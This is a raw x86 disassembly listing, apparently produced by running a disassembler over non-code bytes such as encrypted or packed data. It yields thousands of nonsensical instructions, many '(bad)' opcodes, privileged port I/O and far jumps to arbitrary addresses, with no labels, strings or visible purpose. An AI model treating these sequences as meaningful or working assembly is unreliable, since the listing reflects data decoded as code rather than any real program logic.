  411cdb:	imul   esi,DWORD PTR [esi+0x49],0x65724e07
  411ce2:	mov    bh,0x99
  411ce4:	cmp    edi,DWORD PTR [edi]
  411ce6:	aam    0x2f
  411ce8:	sbb    dl,BYTE PTR [ebx+0x61]
  411ceb:	and    BYTE PTR [edi-0x2654c905],dh
  411cf1:	not    esi
  411cf3:	enter  0x5e15,0xb0
  411cf7:	pop    ds
  411cf8:	mov    al,0x68
  411cfa:	jnp    0x411d45
  411cfc:	mov    dl,BYTE PTR [edi-0x5066a016]
  411d02:	das    
  411d03:	pop    es
  411d04:	icebp  
  411d05:	call   0x9c41:0x6b82b239
  411d0c:	mov    ebx,DWORD PTR ds:0xf1e10192
  411d12:	adc    DWORD PTR [ebp+0x1f],edi
  411d15:	adc    BYTE PTR [eax],dl
  411d17:	pop    ds
  411d18:	iret   
  411d19:	in     eax,0xd8
  411d1b:	(bad)  
  411d1c:	cmp    BYTE PTR [ebp+0x636f8728],0x42
  411d23:	(bad)  
  411d24:	cdq    
  411d25:	jg     0x411cc2
  411d27:	add    edx,esp
  411d29:	add    cl,BYTE PTR ds:0x188d272
  411d2f:	xchg   ecx,eax
  411d30:	xor    dl,al
  411d32:	pushf  
  411d33:	jp     0x411d20
  411d35:	lods   eax,DWORD PTR ds:[esi]
  411d36:	mov    al,ds:0xf8eaa9dc
  411d3b:	fmul   st,st(7)
  411d3d:	xor    al,0xaf
  411d3f:	(bad)  
  411d40:	cmp    bh,BYTE PTR [eax-0x2b97e372]
  411d46:	mov    edx,0xfc4537df
  411d4b:	xchg   BYTE PTR [edx+0x10],bh
  411d4e:	sbb    esp,DWORD PTR [esp+edx*1+0x681a9818]
  411d55:	sbb    ebp,DWORD PTR [edx+0x2693ff03]
  411d5b:	xchg   ebx,eax
  411d5c:	dec    ebx
  411d5d:	clc    
  411d5e:	xchg   esi,eax
  411d5f:	test   eax,0x84d72e30
  411d64:	sbb    al,0x62
  411d66:	xchg   esi,eax
  411d67:	pop    ecx
  411d68:	inc    ebx
  411d69:	frstor ds:0xe75fddbe
  411d6f:	cdq    
  411d70:	lea    ecx,[ebx-0x70c077d1]
  411d76:	shr    BYTE PTR [eax-0x3cfcfbbe],cl
  411d7c:	pushf  
  411d7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d7e:	hlt    
  411d7f:	xchg   ebx,eax
  411d80:	aam    0x79
  411d82:	rcl    edx,1
  411d84:	mov    bl,0xe5
  411d86:	pop    es
  411d87:	repz out 0x9f,eax
  411d8a:	dec    esp
  411d8b:	xchg   esi,eax
  411d8c:	pop    ecx
  411d8d:	mov    dh,0xe
  411d8f:	pop    esp
  411d90:	das    
  411d91:	jmp    0x411d95
  411d93:	mov    eax,DWORD PTR [eax-0x6d65b211]
  411d99:	ror    BYTE PTR [ebp-0x235af98a],0xc9
  411da0:	mov    ebp,0x67feef69
  411da5:	add    ebp,ebx
  411da7:	(bad)  
  411da8:	sti    
  411da9:	push   cs
  411daa:	mov    ?,edx
  411dac:	mov    ?,ebp
  411dae:	dec    ebx
  411daf:	(bad)  
  411db0:	js     0x411dc5
  411db2:	cmp    al,0xc8
  411db4:	dec    ecx
  411db5:	out    dx,al
  411db6:	ficomp WORD PTR [edx+0xf068ab8]
  411dbc:	enter  0xba62,0x2c
  411dc0:	test   BYTE PTR [edi-0x7d],dh
  411dc3:	xor    al,0xc
  411dc5:	(bad)  
  411dc7:	ins    DWORD PTR es:[edi],dx
  411dc8:	ret    
  411dc9:	xchg   esp,eax
  411dca:	dec    esp
  411dcb:	neg    DWORD PTR [ebp+ecx*2-0x14]
  411dcf:	dec    eax
  411dd0:	jae    0x411e20
  411dd2:	mov    dl,BYTE PTR [ecx]
  411dd4:	mov    esp,0xdf3ddd7f
  411dd9:	adc    DWORD PTR [ecx-0x5556cfdc],0x31b83bc7
  411de3:	inc    eax
  411de4:	(bad)  
  411de6:	push   edx
  411de7:	pop    esi
  411de8:	fldcw  WORD PTR [edi]
  411dea:	pop    ss
  411deb:	xchg   edi,eax
  411dec:	jmp    0x411e4d
  411dee:	inc    ebp
  411def:	mov    ecx,DWORD PTR [edi+edi*1-0x3a]
  411df3:	fistp  QWORD PTR [edx]
  411df5:	outs   dx,BYTE PTR ds:[esi]
  411df6:	sbb    dh,BYTE PTR [esi-0x2a]
  411df9:	popa   
  411dfa:	dec    eax
  411dfb:	sbb    al,0xa0
  411dfd:	xor    edx,DWORD PTR [esi-0x23616227]
  411e03:	mov    ch,0x72
  411e05:	in     al,0x22
  411e07:	les    ecx,FWORD PTR [edx+esi*2]
  411e0a:	fsub   QWORD PTR [esi+0x53e20c34]
  411e10:	mov    cl,BYTE PTR ds:0x6e2e2e63
  411e16:	(bad)  
  411e17:	cmp    al,0xf6
  411e19:	mov    dh,0x14
  411e1b:	cld    
  411e1c:	cdq    
  411e1d:	ror    BYTE PTR [ecx+eax*8+0x66c843f9],0xc0
  411e25:	rol    BYTE PTR [ebp*4+0x429ccb63],cl
  411e2c:	ins    DWORD PTR es:[edi],dx
  411e2d:	retf   0x321e
  411e30:	(bad)  
  411e31:	cs push 0xfffffff4
  411e34:	adc    cl,0x37
  411e37:	gs ja  0x411e3d
  411e3a:	xchg   ebp,eax
  411e3b:	xchg   ebx,eax
  411e3c:	mov    ch,0x9e
  411e3e:	out    0xca,al
  411e40:	std    
  411e41:	sbb    DWORD PTR [ebp-0x79],ebp
  411e44:	sbb    cl,BYTE PTR [edi+0x4a]
  411e47:	rcr    BYTE PTR [eax],1
  411e49:	jl     0x411e92
  411e4b:	jle    0x411e25
  411e4d:	ds jp  0x411e22
  411e50:	bound  ecx,QWORD PTR [ecx+0x7976e583]
  411e56:	mov    esi,ss
  411e58:	dec    ecx
  411e59:	lods   al,BYTE PTR ds:[esi]
  411e5a:	xchg   ebx,eax
  411e5b:	adc    BYTE PTR [ebx+0x29b4e7cc],bl
  411e61:	mov    ch,0x18
  411e63:	mov    cs,WORD PTR [edi+0x5d9e1baf]
  411e69:	jns    0x411ee6
  411e6b:	test   BYTE PTR [ebx],dl
  411e6d:	js     0x411e11
  411e6f:	int    0x6b
  411e71:	stos   DWORD PTR es:[edi],eax
  411e72:	in     al,dx
  411e73:	out    dx,al
  411e74:	ins    DWORD PTR es:[edi],dx
  411e75:	fcomp  QWORD PTR [ecx-0x4d3e8de0]
  411e7b:	xchg   cl,al
  411e7d:	jmp    0x411e62
  411e7f:	or     al,0xb2
  411e81:	(bad)  
  411e82:	fld    DWORD PTR [edx+0x32cfe537]
  411e88:	loop   0x411e3c
  411e8a:	shl    DWORD PTR [ebp+0x26],1
  411e8d:	mov    ah,0xa0
  411e8f:	jle    0x411e73
  411e91:	ja     0x411e2f
  411e93:	pushf  
  411e94:	xor    edx,DWORD PTR [ecx+0x62189d7d]
  411e9a:	push   ebx
  411e9b:	stos   DWORD PTR es:[edi],eax
  411e9c:	sub    bl,ch
  411e9e:	xchg   ebp,eax
  411e9f:	int3   
  411ea0:	pusha  
  411ea1:	(bad)  
  411ea2:	cli    
  411ea3:	cmp    ch,BYTE PTR [esi+0x30]
  411ea6:	repz dec ebx
  411ea8:	sub    al,0x76
  411eaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411eab:	mov    ds:0x9af2732,al
  411eb0:	aas    
  411eb1:	pusha  
  411eb2:	or     al,0x14
  411eb4:	bound  esp,QWORD PTR [ebx+0x5c]
  411eb7:	mov    WORD PTR [edi+0x48],fs
  411eba:	mov    ch,0x7e
  411ebc:	jne    0x411e63
  411ebe:	div    DWORD PTR [ecx+0x7f]
  411ec1:	mov    WORD PTR [eax+ebp*2-0xed6ed57],?
  411ec8:	inc    ebp
  411ec9:	repz test eax,0x982a92bf
  411ecf:	push   ebp
  411ed0:	fcomp  QWORD PTR [edx-0x40b075b1]
  411ed6:	rcr    BYTE PTR ds:0x548fe7c6,1
  411edc:	sub    esp,eax
  411ede:	dec    esp
  411edf:	mov    al,ds:0x4c92a168
  411ee4:	mov    ch,0x30
  411ee6:	fisub  DWORD PTR [ebx]
  411ee8:	sbb    BYTE PTR [ebx-0x16],cl
  411eeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411eec:	mov    edi,DWORD PTR [eax-0xece92c0]
  411ef2:	loop   0x411f50
  411ef4:	outs   dx,BYTE PTR ds:[esi]
  411ef5:	push   ecx
  411ef6:	inc    eax
  411ef7:	xor    BYTE PTR [eax],ah
  411ef9:	data16 je 0x411ebb
  411efc:	inc    esp
  411efd:	jge    0x411ed5
  411eff:	pop    ecx
  411f00:	loop   0x411e9b
  411f02:	pop    ebp
  411f03:	test   al,0xd
  411f05:	pop    ss
  411f06:	cmp    al,BYTE PTR [ebp+0x1e]
  411f09:	and    ch,ah
  411f0b:	stos   DWORD PTR es:[edi],eax
  411f0c:	xchg   ebx,edi
  411f0e:	and    eax,0x2f75438
  411f13:	adc    DWORD PTR [esi+0x3],edi
  411f16:	adc    DWORD PTR [eax+eiz*8],edi
  411f19:	xor    bh,cl
  411f1b:	in     eax,dx
  411f1c:	addr16 jle 0x411eb5
  411f1f:	xchg   esi,eax
  411f20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f21:	std    
  411f22:	shr    BYTE PTR [edi+0x592dde6d],cl
  411f28:	push   esi
  411f29:	fidiv  DWORD PTR [eax]
  411f2b:	mov    BYTE PTR [ecx+0x33],dl
  411f2e:	pusha  
  411f2f:	mov    al,0x41
  411f31:	sub    al,0xa1
  411f33:	stos   BYTE PTR es:[edi],al
  411f34:	sbb    dh,BYTE PTR [ebx+0x1e]
  411f37:	xchg   esp,eax
  411f38:	shl    DWORD PTR [edi],0xdb
  411f3b:	xor    eax,DWORD PTR [edi-0x12559000]
  411f41:	shl    dl,cl
  411f43:	xor    esp,DWORD PTR [ecx-0x3650e488]
  411f49:	cld    
  411f4a:	xchg   BYTE PTR [ebp+0x31601c3c],al
  411f50:	add    BYTE PTR [edi+0x5d2690ce],bl
  411f56:	mov    edx,0x47fa2296
  411f5b:	data16 rcl BYTE PTR ds:[esi+esi*2+0x6ef51752],cl
  411f64:	pop    ecx
  411f65:	retf   0x1614
  411f68:	scas   eax,DWORD PTR es:[edi]
  411f69:	inc    edi
  411f6a:	pushf  
  411f6b:	fnstsw WORD PTR [edx+esi*2-0x7]
  411f6f:	jns    0x411f67
  411f71:	aad    0x53
  411f73:	fnstenv [edi]
  411f75:	dec    esi
  411f76:	jecxz  0x411fcf
  411f78:	push   ebp
  411f79:	cmp    ecx,DWORD PTR [edx]
  411f7b:	sbb    BYTE PTR [esi+ebp*2+0x59],al
  411f7f:	ret    0xd5d5
  411f82:	sbb    DWORD PTR [eax+ecx*8-0x18],edi
  411f86:	lahf   
  411f87:	fwait
  411f88:	jmp    0x411fa3
  411f8a:	push   es
  411f8b:	jge    0x411f57
  411f8d:	fild   DWORD PTR [ebx+0x6f]
  411f90:	adc    eax,0xdbbeebe5
  411f95:	scas   eax,DWORD PTR es:[edi]
  411f96:	inc    edi
  411f97:	push   0x229a2de9
  411f9c:	mov    BYTE PTR [ecx],cl
  411f9e:	leave  
  411f9f:	leave  
  411fa0:	(bad)  
  411fa1:	mov    ds:0x7961ec17,eax
  411fa6:	xor    esi,ecx
  411fa8:	jp     0x411f2f
  411faa:	sbb    ebp,DWORD PTR [edx-0x1bd07780]
  411fb0:	and    eax,DWORD PTR [edx*2-0x6261c40e]
  411fb7:	cmp    eax,0xb86e6cbe
  411fbc:	mov    esp,esi
  411fbe:	inc    edx
  411fbf:	mov    ah,0xd9
  411fc1:	jl     0x412023
  411fc3:	lahf   
  411fc4:	mov    ecx,DWORD PTR [edx]
  411fc6:	gs in  al,dx
  411fc8:	ins    BYTE PTR es:[edi],dx
  411fc9:	imul   eax,DWORD PTR [ebp+0x53f1c6d2],0x3b3845dc
  411fd3:	sub    ah,BYTE PTR [edi-0x36a04d91]
  411fd9:	mov    edx,0xa1da64e2
  411fde:	fdiv   QWORD PTR [eax+0x7f617882]
  411fe4:	jmp    0x12d1:0x55dc66fe
  411feb:	add    DWORD PTR [esi-0x2e60a184],edi
  411ff1:	cmc    
  411ff2:	mov    al,0x8
  411ff4:	out    0xbd,al
  411ff6:	call   0x506bc6a2
  411ffb:	es push ss
  411ffd:	(bad)  
  411ffe:	xchg   edx,eax
  411fff:	mov    bh,0xa2
  412001:	imul   DWORD PTR [ebx-0x6e7fc957]
  412007:	jne    0x411fec
  412009:	add    BYTE PTR [ebx-0x17170cb7],dl
  41200f:	xchg   esp,eax
  412010:	mov    ds:0x972c1249,eax
  412015:	pop    esi
  412016:	fwait
  412017:	pop    DWORD PTR [edx-0x2f143f6e]
  41201d:	ins    BYTE PTR es:[edi],dx
  41201e:	mov    esi,0xc732c7d7
  412023:	fsubr  st,st(3)
  412025:	xchg   ecx,eax
  412026:	sub    bh,al
  412028:	aam    0xc4
  41202a:	dec    ecx
  41202b:	adc    DWORD PTR [edi+0x67],ebp
  41202e:	shl    ebp,1
  412030:	loop   0x412019
  412032:	mov    bl,0xf9
  412034:	or     eax,0x619a1fa4
  412039:	push   ecx
  41203a:	les    eax,FWORD PTR [ebx]
  41203c:	hlt    
  41203d:	pop    edx
  41203e:	(bad)  
  41203f:	daa    
  412040:	int3   
  412041:	lahf   
  412042:	jp     0x412040
  412044:	daa    
  412045:	dec    ebp
  412046:	adc    BYTE PTR [ebx-0x45a6fc54],dl
  41204c:	leave  
  41204d:	out    dx,al
  41204e:	sbb    al,0xdd
  412050:	xchg   esp,eax
  412051:	jge    0x412047
  412053:	cmp    al,0xdc
  412055:	and    bh,BYTE PTR [eax+0x6ed9c0f3]
  41205b:	pusha  
  41205c:	cli    
  41205d:	mov    eax,0xd908c2ba
  412062:	je     0x41204d
  412064:	loop   0x4120bc
  412066:	outs   dx,DWORD PTR ds:[esi]
  412067:	aaa    
  412068:	in     al,0xe0
  41206a:	push   ss
  41206b:	mov    esp,0xe1e2108a
  412070:	sahf   
  412071:	mov    al,BYTE PTR [edx+eiz*8-0x41ddd20a]
  412078:	leave  
  412079:	fwait
  41207a:	inc    ebx
  41207b:	fsubr  DWORD PTR [ebp+0x18]
  41207e:	push   edx
  41207f:	xchg   DWORD PTR [ebx+0x55c0a7fc],edx
  412085:	cmovnp edi,DWORD PTR [ebp+0x10]
  412089:	xchg   ch,dl
  41208b:	mov    eax,esi
  41208d:	push   esi
  41208e:	aas    
  41208f:	std    
  412090:	dec    edi
  412091:	fsubr  DWORD PTR [ebp-0x2c14495e]
  412097:	pop    eax
  412098:	into   
  412099:	mov    BYTE PTR [ecx],al
  41209b:	(bad)  
  41209c:	loopne 0x412020
  41209e:	push   0x3a
  4120a0:	aam    0xc2
  4120a2:	sbb    esp,DWORD PTR [ebx]
  4120a4:	nop
  4120a5:	mov    ds:0xf2b6550b,al
  4120aa:	int    0x4f
  4120ac:	jl     0x4120ae
  4120ae:	or     DWORD PTR [ebx-0x5b597afd],ebp
  4120b4:	sub    cl,cl
  4120b6:	xchg   esi,eax
  4120b7:	inc    edx
  4120b8:	or     edi,esp
  4120ba:	add    eax,0x766068ef
  4120bf:	xor    DWORD PTR [ebp-0x43bf42a],ecx
  4120c5:	mov    ebx,0x9a8666c7
  4120ca:	xchg   ecx,eax
  4120cb:	(bad)  [ebp-0x65ee59be]
  4120d1:	mov    bl,0xe8
  4120d3:	aas    
  4120d4:	jno    0x4120a8
  4120d6:	adc    eax,eax
  4120d8:	adc    eax,0x5290b45c
  4120dd:	(bad)  
  4120de:	loop   0x412119
  4120e0:	nop
  4120e1:	add    al,0xf2
  4120e3:	mov    edi,0x91a962bd
  4120e8:	call   0xaef0ae7e
  4120ed:	mov    ch,0xa4
  4120ef:	cmp    BYTE PTR [eax-0x15a39fca],dl
  4120f5:	dec    eax
  4120f6:	jo     0x412080
  4120f8:	inc    ebp
  4120f9:	call   0x10eed068
  4120fe:	out    dx,eax
  4120ff:	add    ebp,ecx
  412101:	ja     0x4120b5
  412103:	jmp    DWORD PTR [eax-0x5c]
  412106:	out    0x9f,eax
  412108:	test   DWORD PTR [ebx-0x743fba74],ecx
  41210e:	scas   al,BYTE PTR es:[edi]
  41210f:	xchg   DWORD PTR [esi],edx
  412111:	dec    eax
  412112:	cmp    bh,BYTE PTR [esi+0x374da0c]
  412118:	data16 mov WORD PTR [esi],fs
  41211b:	xchg   edi,eax
  41211c:	fpatan 
  41211e:	and    bl,ah
  412120:	ret    
  412121:	cdq    
  412122:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412123:	sub    eax,0x49f2b242
  412128:	in     eax,0x8e
  41212a:	ins    BYTE PTR es:[edi],dx
  41212b:	adc    edx,ebx
  41212d:	jle    0x412198
  41212f:	fld    QWORD PTR [eax-0x65]
  412132:	push   esp
  412133:	scas   al,BYTE PTR es:[edi]
  412134:	sub    ch,dl
  412136:	pop    eax
  412137:	push   ebx
  412138:	stc    
  412139:	(bad)  
  41213a:	or     DWORD PTR [edx],edi
  41213c:	aam    0x9e
  41213e:	inc    esp
  41213f:	gs mov bh,0xfe
  412142:	out    dx,eax
  412143:	repnz xchg ecx,eax
  412145:	call   0xa4d3d7a1
  41214a:	mov    ah,0x91
  41214c:	mov    dh,0x48
  41214e:	jl     0x41214f
  412150:	xchg   esi,eax
  412151:	out    dx,eax
  412152:	xchg   edi,eax
  412153:	clc    
  412154:	das    
  412155:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412156:	icebp  
  412157:	jecxz  0x41219d
  412159:	pop    ecx
  41215a:	mov    eax,0xf9d28de1
  41215f:	push   edx
  412160:	mov    eax,0x5c9cd7b1
  412165:	jo     0x412157
  412167:	jle    0x4121ce
  412169:	stc    
  41216a:	cmp    ecx,DWORD PTR [edx+0x352842f4]
  412170:	add    al,BYTE PTR [edx-0x3]
  412173:	xchg   esi,eax
  412174:	std    
  412175:	in     al,dx
  412176:	or     ebp,esi
  412178:	xor    DWORD PTR [ebp+0x14],ecx
  41217b:	dec    esi
  41217c:	inc    edi
  41217d:	aas    
  41217e:	fmul   QWORD PTR [eax-0x110458b7]
  412184:	ins    BYTE PTR es:[edi],dx
  412185:	mov    ebp,0xbf91196a
  41218a:	mov    cl,bh
  41218c:	test   BYTE PTR [ebx+0x6d],bl
  41218f:	xor    eax,DWORD PTR [ebx-0x6a163cc6]
  412195:	test   eax,0xf23b178d
  41219a:	xchg   BYTE PTR [ecx+edi*1-0x1a],dh
  41219e:	mov    BYTE PTR [eax+ebx*4-0x71],bl
  4121a2:	adc    ah,bh
  4121a4:	pop    es
  4121a5:	imul   ecx,ebx,0x7634180d
  4121ab:	out    0x97,eax
  4121ad:	xchg   edx,eax
  4121ae:	adc    eax,0xb78a98b
  4121b3:	push   ebp
  4121b4:	outs   dx,BYTE PTR ds:[esi]
  4121b5:	nop
  4121b6:	sbb    al,0x75
  4121b8:	paddq  mm6,QWORD PTR [edi+0x49159c8]
  4121bf:	jns    0x412203
  4121c1:	add    edi,DWORD PTR cs:[ebp-0x2aee981b]
  4121c8:	cli    
  4121c9:	ret    
  4121ca:	sahf   
  4121cb:	retf   0x86ce
  4121ce:	sub    al,0x16
  4121d0:	jp     0x412168
  4121d2:	inc    ebx
  4121d3:	pop    ds
  4121d4:	jns    0x4121c1
  4121d6:	xchg   BYTE PTR [edi-0x75],al
  4121d9:	cmp    al,0xef
  4121db:	out    dx,eax
  4121dc:	pop    ebx
  4121dd:	ret    0x51b4
  4121e0:	repz fnsave [esi-0x2e]
  4121e4:	mov    esp,0xde85f2a6
  4121e9:	aaa    
  4121ea:	inc    esp
  4121eb:	adc    al,0x7
  4121ed:	aam    0xa5
  4121ef:	clc    
  4121f0:	lods   al,BYTE PTR ds:[esi]
  4121f1:	pop    ds
  4121f2:	mov    gs,WORD PTR [ecx]
  4121f4:	xor    BYTE PTR [ebx+0x29],0x30
  4121f8:	add    ch,al
  4121fa:	ins    BYTE PTR es:[edi],dx
  4121fb:	mov    eax,ds:0x7c342f84
  412200:	cmp    bh,BYTE PTR [eax-0x11]
  412203:	mov    esi,DWORD PTR [ebx-0x1a6cb4b8]
  412209:	dec    ecx
  41220a:	in     al,0x79
  41220c:	xor    al,0x52
  41220e:	mov    ds:0xda3fc6df,eax
  412213:	test   al,0x4b
  412215:	and    al,BYTE PTR [ebp+0x6519da0e]
  41221b:	add    DWORD PTR [esi+0x16],esi
  41221e:	and    dl,bh
  412220:	aaa    
  412221:	pop    ss
  412222:	adc    esp,DWORD PTR ds:0x25c1af5e
  412228:	jnp    0x41225a
  41222a:	les    ecx,FWORD PTR [ebx+ecx*4-0x75]
  41222e:	sbb    eax,0x3508bea9
  412233:	dec    edx
  412234:	gs daa 
  412236:	in     al,dx
  412237:	loop   0x4121c5
  412239:	test   eax,0xe2fbf5f7
  41223e:	cmc    
  41223f:	aad    0x1
  412241:	sub    DWORD PTR [eax],esi
  412243:	retf   
  412244:	aad    0x4f
  412246:	lea    ebp,[edx]
  412248:	sub    DWORD PTR [ebp-0x5],ecx
  41224b:	fs out 0xc5,eax
  41224e:	sub    BYTE PTR [eax+0x46],cl
  412251:	sub    ch,bh
  412253:	xor    eax,ebx
  412255:	cmp    eax,0x51c3fb6
  41225a:	mov    esp,0x6c892570
  41225f:	mov    dh,0xef
  412261:	xchg   ecx,edi
  412263:	fs inc eax
  412265:	data16 fadd DWORD PTR [ebp-0x5f97582c]
  41226c:	out    0xb0,eax
  41226e:	mov    bl,0x56
  412270:	pusha  
  412271:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412272:	mov    bl,0x33
  412274:	jge    0x4122c7
  412276:	addr16 pop esp
  412278:	sti    
  412279:	icebp  
  41227a:	rcl    DWORD PTR [edi],1
  41227c:	stos   BYTE PTR es:[edi],al
  41227d:	(bad)  
  41227e:	stos   DWORD PTR es:[edi],eax
  41227f:	je     0x7048ee6f
  412285:	push   cs
  412286:	xchg   edx,eax
  412287:	and    esi,DWORD PTR [ecx]
  412289:	xor    edx,DWORD PTR ds:0x36d913fc
  41228f:	mov    bh,0x69
  412291:	out    0x5a,eax
  412293:	xchg   ecx,eax
  412294:	jno    0x412284
  412296:	pushf  
  412297:	neg    DWORD PTR [ebx+eax*1+0x7b]
  41229b:	repz in al,0xf7
  41229e:	sbb    BYTE PTR ss:[eax-0x7312adbf],ah
  4122a5:	jo     0x4122dd
  4122a7:	cmp    al,0xf7
  4122a9:	stos   DWORD PTR es:[edi],eax
  4122aa:	jb     0x4122a0
  4122ac:	mov    esi,0x24839dc4
  4122b1:	jno    0x412322
  4122b3:	jmp    0x11c6b2f8
  4122b8:	xor    BYTE PTR [bx+di-0x5d],bl
  4122bc:	jle    0x4122ee
  4122be:	fs pop edx
  4122c0:	pushf  
  4122c1:	ror    DWORD PTR [ebp-0x75],0x7a
  4122c5:	sti    
  4122c6:	popf   
  4122c7:	fwait
  4122c8:	retf   0x919c
  4122cb:	or     bh,bh
  4122cd:	je     0x41227a
  4122cf:	aaa    
  4122d0:	mov    ds:0xd81511df,eax
  4122d5:	or     ecx,DWORD PTR [eax-0x1b92d374]
  4122db:	and    al,0xcd
  4122dd:	jns    0x412337
  4122df:	repnz retf 
  4122e1:	pop    es
  4122e2:	jo     0x412265
  4122e4:	mov    ds:0xa5e82b90,al
  4122e9:	or     eax,0x31264148
  4122ee:	mov    ecx,DWORD PTR [eax+0x30]
  4122f1:	(bad)  
  4122f2:	pop    eax
  4122f3:	jae    0x41230f
  4122f5:	lahf   
  4122f6:	pop    edi
  4122f7:	ss out dx,al
  4122f9:	jl     0x412324
  4122fb:	and    eax,esi
  4122fd:	sub    al,0xc7
  4122ff:	mov    bh,BYTE PTR [ebx]
  412301:	pop    ebp
  412302:	adc    al,0xa9
  412304:	adc    DWORD PTR [eax-0x17],esi
  412307:	out    0xb5,al
  412309:	test   DWORD PTR [ebp-0xe],esi
  41230c:	adc    al,ah
  41230e:	pop    ss
  41230f:	rcl    dl,0x33
  412312:	(bad)  
  412314:	mov    edi,0x59c1429b
  41231a:	mov    WORD PTR [ecx],gs
  41231c:	add    DWORD PTR [edi+ebp*2+0x4027051c],esi
  412323:	(bad)  
  412324:	xor    al,BYTE PTR [ebx-0x52]
  412327:	or     ebp,DWORD PTR [eax+0x26641bfd]
  41232d:	add    ebp,edx
  41232f:	(bad)  
  412330:	mov    bh,0xaa
  412332:	xor    DWORD PTR [ebp+0x3e63c937],ebx
  412338:	push   ds
  412339:	jp     0x41237e
  41233b:	add    eax,0x4f5118b0
  412340:	add    BYTE PTR ds:0x7b16d5d6,0x8d
  412347:	bound  esi,QWORD PTR [ecx]
  412349:	jmp    edx
  41234b:	test   eax,0xdb638c8e
  412350:	add    ch,BYTE PTR [ebp+0x1c]
  412353:	syscall 
  412355:	icebp  
  412356:	das    
  412357:	enter  0xd60f,0xeb
  41235b:	sahf   
  41235c:	mov    dl,0xb6
  41235e:	jne    0x412354
  412360:	inc    edx
  412361:	(bad)  
  412362:	lods   al,BYTE PTR ds:[esi]
  412363:	cld    
  412364:	xchg   esi,eax
  412365:	imul   ecx,edi,0xffffffe5
  412368:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412369:	sbb    esp,DWORD PTR [eax-0x1ff4a50c]
  41236f:	jnp    0x4123d3
  412371:	imul   ebp,ecx,0x5de8258d
  412377:	push   0x22
  412379:	(bad)  
  41237a:	shr    DWORD PTR [esi],1
  41237c:	pop    ecx
  41237d:	sbb    al,0x51
  41237f:	inc    esi
  412380:	sbb    dl,BYTE PTR [edx+ebp*1]
  412383:	imul   eax,ecx,0x815399be
  412389:	xor    ecx,DWORD PTR [ebx-0x57]
  41238c:	nop
  41238d:	dec    ecx
  41238e:	or     ecx,DWORD PTR [ebx]
  412390:	pop    eax
  412391:	clc    
  412392:	push   ebp
  412393:	leave  
  412394:	aaa    
  412395:	imul   esi,DWORD PTR [ebx-0x80],0xffffffa1
  412399:	sbb    DWORD PTR [ebp-0x33332500],eax
  41239f:	fs jg  0x41234c
  4123a2:	pop    ds
  4123a3:	clc    
  4123a4:	(bad)  
  4123a6:	lock jnp 0x41233f
  4123a9:	test   DWORD PTR [ecx],edi
  4123ab:	cli    
  4123ac:	test   BYTE PTR ds:[edx+0x7b],0xe4
  4123b1:	aam    0xeb
  4123b3:	mov    cs,ebp
  4123b5:	or     dh,BYTE PTR ds:[eax]
  4123b8:	fadd   DWORD PTR [esi]
  4123ba:	outs   dx,BYTE PTR ds:[esi]
  4123bb:	sub    eax,0x1f5d043a
  4123c0:	push   esp
  4123c1:	hlt    
  4123c2:	pop    ds
  4123c3:	retf   
  4123c4:	pop    ss
  4123c5:	popf   
  4123c6:	mul    al
  4123c8:	sub    cl,ch
  4123ca:	xlat   BYTE PTR ds:[ebx]
  4123cb:	sbb    eax,ebx
  4123cd:	cmp    esp,ecx
  4123cf:	jne    0x4123c7
  4123d1:	call   FWORD PTR [ebp+0xe]
  4123d4:	sub    bh,BYTE PTR ds:0xb7752837
  4123da:	rol    DWORD PTR [ebp-0x44b32ca5],1
  4123e0:	sub    cl,bl
  4123e2:	hlt    
  4123e3:	cwde   
  4123e4:	ror    DWORD PTR [ecx],cl
  4123e6:	mov    ebp,0x336f5f7f
  4123eb:	dec    ebp
  4123ec:	add    ebx,DWORD PTR [ebx+edx*4]
  4123ef:	cmp    BYTE PTR [eax+eiz*8+0x2d],dl
  4123f3:	aas    
  4123f4:	in     eax,dx
  4123f5:	pusha  
  4123f6:	or     al,0xd2
  4123f8:	aam    0x9
  4123fa:	mov    eax,ds:0xe49c5d10
  4123ff:	ds push 0x15c09586
  412405:	out    0xff,eax
  412407:	pusha  
  412408:	xlat   BYTE PTR ds:[ebx]
  412409:	sti    
  41240a:	xchg   edx,eax
  41240b:	call   0x33b15570
  412410:	aaa    
  412411:	xor    eax,0xedad4644
  412416:	sar    ch,cl
  412418:	icebp  
  412419:	ins    BYTE PTR es:[edi],dx
  41241a:	retf   0x5449
  41241d:	cmp    al,BYTE PTR [ecx+0x2a]
  412420:	cdq    
  412421:	jne    0x41240f
  412423:	mov    DWORD PTR [ecx],esp
  412425:	cwde   
  412426:	pop    esi
  412427:	sahf   
  412428:	jmp    0x4124a0
  41242a:	ret    
  41242b:	scas   al,BYTE PTR es:[edi]
  41242c:	sub    cl,BYTE PTR [edi-0x70]
  41242f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412430:	xlat   BYTE PTR ds:[ebx]
  412431:	jne    0x412400
  412433:	jb     0x4123c4
  412435:	xchg   esp,eax
  412436:	mov    al,0xab
  412438:	jmp    0x313928ab
  41243d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41243e:	mul    cl
  412440:	leave  
  412441:	je     0x4124a4
  412443:	sti    
  412444:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412445:	fisttp WORD PTR [edx+0x49a7b9ad]
  41244b:	sbb    al,0x6e
  41244d:	lods   al,BYTE PTR ds:[esi]
  41244e:	jne    0x4124a8
  412450:	ins    DWORD PTR es:[edi],dx
  412451:	pop    edx
  412452:	clc    
  412453:	xor    BYTE PTR [eax-0x3c],0xd3
  412457:	add    edx,ebp
  412459:	loope  0x4124a9
  41245b:	les    ebp,FWORD PTR [esi]
  41245d:	out    0xc1,eax
  41245f:	sub    DWORD PTR [edi],eax
  412461:	push   0xa9aa1a0e
  412466:	fsub   QWORD PTR ds:0x5bad66a2
  41246c:	mov    edx,0x1521e728
  412471:	cmp    dl,cl
  412473:	add    eax,0x7fdbde00
  412478:	cmovs  eax,eax
  41247b:	aaa    
  41247c:	dec    edi
  41247d:	adc    edx,eax
  41247f:	inc    edi
  412480:	add    al,0xd5
  412482:	in     al,dx
  412483:	add    eax,0xd7010156
  412488:	repnz push ebx
